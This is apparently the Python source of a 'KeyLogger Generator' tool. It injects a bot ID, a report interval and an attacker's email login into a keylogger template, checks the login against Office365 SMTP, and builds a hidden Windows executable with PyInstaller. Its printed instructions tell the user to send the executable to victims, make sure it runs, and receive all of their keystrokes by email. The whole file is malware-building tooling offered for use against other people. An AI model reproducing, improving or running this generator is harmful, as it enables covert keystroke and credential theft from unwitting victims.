# Versoin: 1.1
# Author: evilfeonix
# Name: KeyLogger Generator
# Date: 01 - JANUARY - 2025
# Website: www.evilfeonix.com 
# Email: evilfeonix@gmail.com

import re, os, sys, time, socket, smtplib, random, argparse, subprocess


P4773RN_=r'^[B-T]{3}_[D-I]{2}_[B-U]{6} = <[b-t]{3}_[d-u]{3}>+$'                         # KeyLogger identifier position
P4773RN__=r'^[E-U]{4}_[D-N]{6}_[E-T]{4} = <[d-s]{4}-[e-t]{6}-[e-y]{5}-[c-s]{6}>+$'      # Send report every second position
P4773RN___=r'^[A-M]{5}_[A-S]{7} = <[a-t]{11}-[a-m]{5}@[d-v]{8}.[d-t]{3}>+$'             # Perpetretor email address position
P4773RN____=r'^[A-M]{5}_[A-W]{8} = <[a-t]{11}-[a-m]{5}-[a-w]{8}-[e-r]{4}>+$'            # Perpetretor email password position


BOT_ID_NUMBER = "<bot_uid>"
USER_DEFINE_TIME = "<send-report-every-second>"
EMAIL_ADDRESS = "<perpetrator-email@provider.tld>"
EMAIL_PASSWORD = "<perpetrator-email-password-here>"

def slow(y, interval=1./500):
    for x in y+'\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(interval) 


try:import colorama, keyboard
except Exception as a:
    os.system("cls || clear")
    time.sleep(3)
    slow("""
===========================================================
|         _  __                 ____                      |
|        | |/ /___ _   _       / ___| ___ _ __            |
|        | ' // _ \ | | |_____| |  _ / _ \ '_ \\           |
|        | . \  __/ |_| |_____| |_| |  __/ | | |          |
|        |_|\_\___|\__, |      \____|\___|_| |_|          |
|          v[1.0]  |___/   Coded By EvilFeonix            |
===========================================================
          """)
    slow("\033[31m [!] Ops!, Some Libraries are not Install...   ")
    slow(f"\033[31m [-] Run: bash installer.sh  \n")
    os.sys.exit()

from colorama import Fore

class KeyLoggerGen:
    def __init__(self, temp, time, email, password):
        self.V3R510N="1.0"
        self.N4M3="KeyLogger"
        self.AU7H0R="evilfeonix"

        self.t1m3=time
        self.em41l=email
        self.t3mpl473=temp
        self.mailAuthErr=None
        self.p455w0rd=password

        self.B07_1D=random.randint(0000,9999)

    def GenerateNewBot(self):
        B07C0D3=[]
        with open(self.t3mpl473, "r") as t3mp:
            lines=t3mp.readlines()

            for line in lines:
                
                if re.match(P4773RN_,line):
                    line=line.replace(BOT_ID_NUMBER,str(self.B07_1D))
                
                elif re.match(P4773RN__, line):
                    if not self.t1m3:
                        line=line.replace(USER_DEFINE_TIME,'""')
                    else:
                        line=line.replace(USER_DEFINE_TIME,str(self.t1m3))

                elif re.match(P4773RN___,line):
                    line=line.replace(EMAIL_ADDRESS,f'"{self.em41l}"')

                elif re.match(P4773RN____,line):
                    line=line.replace(EMAIL_PASSWORD,f'"{self.p455w0rd}"')
                B07C0D3.append(line)

        f1l3=self.BotTempName(self.N4M3, self.B07_1D)
        with open(f1l3,"w") as f30n1x:
            f30n1x.writelines(B07C0D3)
        self.packageBotToExe(f1l3)

    def internet(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect_ex(("www.google.com",80))
            return True
        except Exception:return False

    def BotBanner(self):
        banner = """
===========================================================
|         _  __                 ____                      |
|        | |/ /___ _   _       / ___| ___ _ __            |
|        | ' // _ \ | | |_____| |  _ / _ \ '_ \\           |
|        | . \  __/ |_| |_____| |_| |  __/ | | |          |
|        |_|\_\___|\__, |      \____|\___|_| |_|          |
|          v[1.0]  |___/   Coded By EvilFeonix            |
===========================================================
          """
        return banner

    def Requested_INT(self, second=None):
        interval=int(second)
        if not interval >= 59:
            slow(self.BotBanner())
            slow(f"\n{Fore.CYAN}[!] Please Specified Report Interval (In Seconds) That Is Above 1 Minute")
            slow(f"\teg.( {Fore.WHITE}60 seconds = 1 minute{Fore.CYAN} )            ")
            slow(f"\teg.( {Fore.WHITE}120 seconds = 2 minutes{Fore.CYAN} )          ")
            slow(f"\teg.( {Fore.WHITE}180 seconds = 3 minutes{Fore.CYAN} )          ")
            slow(f"\teg.( {Fore.WHITE}240 seconds = 4 minutes{Fore.CYAN} )          ")
            slow(f"[!] And so on!.\n                         {Fore.WHITE}")
            slow("===========================================================")
            os.sys.exit()
        pass

    def BotTempName(self, bot_name, bot_id):
        f1l3=f"{bot_name}-{bot_id}"
        Tempdir = os.path.join('template',f1l3)
        if not os.path.exists(Tempdir):
            os.makedirs(Tempdir)
        p47h = os.path.join(Tempdir, f"{f1l3}")
        return p47h


    def BotToExe_result(self, exe_name):
        config_path=[]

        spec=os.path.join(f'{exe_name}.spec')
        dist=os.path.join("dist",f'{exe_name}.exe')
        log=os.path.join("log",exe_name,f'{exe_name}.log')
        pkg=os.path.join("build",exe_name,f'{exe_name}.pkg')
        temp=os.path.join("template",exe_name,f'{exe_name}')

        config_path.append(pkg)
        config_path.append(spec)
        config_path.append(dist)
        config_path.append(temp)
        os.system('clear || cls')
        time.sleep(2)

        for path in config_path:
            if not os.path.exists(path):
                time.sleep(1)
                slow(self.BotBanner())
                slow(f"{Fore.RED}[-] Seems Like An Error Occure While Generating This Keylogger")
                slow(f"{Fore.CYAN}[!] Check The Log File To Analyse And Try Solving The Problem{Fore.WHITE}")
                slow(f"\tPath To File: {os.path.join('log',exe_name,f'{exe_name}.log')}")
                slow(f"{Fore.CYAN}[!] If You Can't Solve The Problem Then Contact Us Across Our Platforms")
                if self.mailAuthErr==True:
                    slow(f"{Fore.YELLOW}[+] Our Keylogger can not send any Report to Your Email")
                    slow(f"{Fore.CYAN}[!] Consider visitting http://github.com/evilfeonix/Python-SMTP-Authentication-Unsuccessful-Debugging-Tips-To-Try")
                    slow(f"[!] Read the Blog Curefully and Consider doing What is Writing.")
                slow(f"{Fore.CYAN}[!] Visit https://github.com/evilfeonix/Key-Gen for More Details.")
                slow(f"{Fore.CYAN}[!] Follow us on github, Fork and Star our Repositories")
                slow(f"{Fore.RED}[-] Thanks For Using This Tool                {Fore.WHITE}")
                slow("===========================================================\n")
                os.sys.exit()
            pass
        
        slow(self.BotBanner())
        slow(f'{Fore.GREEN}[*] Congratulation!, Keylogger successfully generated.{Fore.WHITE}')
        slow(f'\tKeylogger Id: {self.B07_1D}')
        slow(f'\tKeylogger Name: {self.N4M3}')
        slow(f'\tFile Name: {exe_name}.exe')
        slow(f'\tPath To File: {dist}')
        slow(f'{Fore.CYAN}[!] You Can Now Get The Executable Keylogger File.')
        slow('[!] Send The Keylogger File To Your Victims Machine.')
        slow('[!] Ensure That The Keylogger File was Started on Victims Machine.')
        slow('[!] When The Keylogger Started, It Gonna record all Keystroke.')
        slow('[!] When Victims Connect to Networt, It Gonna send all recorded Keystroke to the Email you Provided.')
        if self.mailAuthErr==True:
            slow(f"{Fore.YELLOW}[+] Our Keylogger can not send any Report to Your Email")
            slow(f"{Fore.CYAN}[!] Consider visitting http://github.com/evilfeonix/Python-SMTP-Authentication-Unsuccessful-Debugging-Tips-To-Try")
            slow(f"[!] Read the Blog Curefully and Consider doing What is Writing.")
        slow('[!] Visit https://github.com/evilfeonix/Key-Gen for More Details.')
        slow(f'{Fore.GREEN}[*] Follow us on github, Fork and Star our Repositories')
        slow(f"[*] Thanks For Using This Tool                    {Fore.WHITE}")
        slow("===========================================================\n")
        os.sys.exit()
      

    def TestMailDetails(self, email, password):
        try:
            server = smtplib.SMTP(host="smtp.office365.com", port=587)
            server.starttls()
            try:
                server.login(email, password)
                self.mailAuthErr==False
                pass
            except smtplib.SMTPAuthenticationError as err:
                if str(err)[14]=='<':
                    self.mailAuthErr==False
                    pass
                else: 
                    time.sleep(3)
                    self.mailAuthErr==True
                    slow(f"{Fore.RED}[-] Email Username or Password are Incorrect!\n {err}")
                    act = input("[+] Are you Sure your email credential are correct\n\temail\n\tpassword\n[Yes/No]")
                    if act.lower() in ['y','yes']:
                        slow(f"{Fore.YELLOW}[+] Our Keylogger can not send You any Report due to this Error")
                        slow(f"{Fore.CYAN}[!] Consider visitting http://github.com/evilfeonix/Python-SMTP-Authentication-Unsuccessful-Debugging-Tips-To-Try")
                        slow(f"[!] Read the Blog curefully and Consider doing What is Writing.")
                        time.sleep(3)
                        os.system("cls || clear")
                        slow(self.BotBanner())
                    else:
                        slow(f"{Fore.RED}[-] Try Again, and Make Sure to put Your Email Credential Correctly.\n{Fore.WHITE}")
                        os.sys.exit()

        except Exception as a:
            time.sleep(3)
            slow(f"{Fore.RED}[-] Please Check Your Internet Connection.\n{Fore.WHITE}")
            os.sys.exit()

    def packageBotToExe(self, b07_5cr1p7):
        filename=f"{self.N4M3}-{self.B07_1D}"
        cmd=f'pyinstaller --noconfirm --onefile --windowed --name "{filename}"  "{b07_5cr1p7}"'

        log=os.path.join("log",filename)
        if not os.path.exists(log):
            os.makedirs(log)
        log = os.path.join(log,f'{filename}.log')

        slow(f"{Fore.CYAN}[!] Press CTRL+C To Coucil Keylogger Generation{Fore.WHITE}")
        try:os.system(f"{cmd} | tee {log}")
        except KeyboardInterrupt:
            time.sleep(3)
            slow(f"{Fore.RED}[-] Generating Keylogger was Cauncil\n{Fore.WHITE}")
            os.sys.exit()
        
        input(f'{Fore.YELLOW}[+] Press [ENTER] To Continue')
        slow(f'{Fore.YELLOW}[+] Loading, Please Wait!...')
        self.BotToExe_result(filename)



def main():
    parser=argparse.ArgumentParser(
        description = "A python based-project that armes to generate an Executable KeyLogger!,"
    )

    parser.add_argument(
        "--template", default="TEMP",
        help="path to template file"
    )

    parser.add_argument( 
        "-e", "--email", 
        dest= "email_address", 
        type=str, help="Specify your email address"
    )

    parser.add_argument( 
        "-p", "--password", 
        dest= "email_password",  
        type=str, help="Specify your email password"
    )

    parser.add_argument( 
        "-r", "--report", 
        dest= "report_interval", default="60",
        type=str, help='Specify an interval for sending report, in seconds'
    )

    argument = parser.parse_args()
    os.system('clear || cls')

    generate=KeyLoggerGen(
        temp=argument.template, 
        time=argument.report_interval, 
        email=argument.email_address, 
        password=argument.email_password
    )

    if not argument.email_address and argument.email_password == None:
        slow(generate.BotBanner())
        slow(f"USAGE: python3 {sys.argv[0]} [Options.. [-e] [-p] [-r]]")
        slow(f"\t-e\tSpecify Email Address To Send Report               ")
        slow(f"\t-p\tSpecify Password Of The Email Address              ")
        slow(f"\t-r\tSpecify Interval For Sending Report                    ")
        slow(f"")
        slow(f"Example: python3 {sys.argv[0]} -e email@domain.tld -p pass1234")
        slow(f"Example: python3 {sys.argv[0]} -e email@domain.tld -p pass1234 -r 600")
        slow(f"")
        slow(f"{Fore.CYAN}[!]  Ensure that the report Interval is written in seconds  [!]")
        slow(f"[!] "+"eg.( 600 seconds = 10 minutes)".center(55," ")+" [!]")
        slow(f"{Fore.WHITE}===========================================================\n")
        os.sys.exit()

    slow(generate.BotBanner())

    if not generate.internet():
    # if generate.internet():
        time.sleep(3)
        slow(f"\n{Fore.CYAN}[!] Internet Connection Is Requested!"      )
        slow(f"{Fore.RED}[-] Please Check Your Internet Connection\n{Fore.WHITE}")
        os.sys.exit()

    generate.TestMailDetails(argument.email_address, argument.email_password)
    generate.Requested_INT(second=argument.report_interval)
    generate.GenerateNewBot()
    

if __name__ == "__main__":
    main()
    
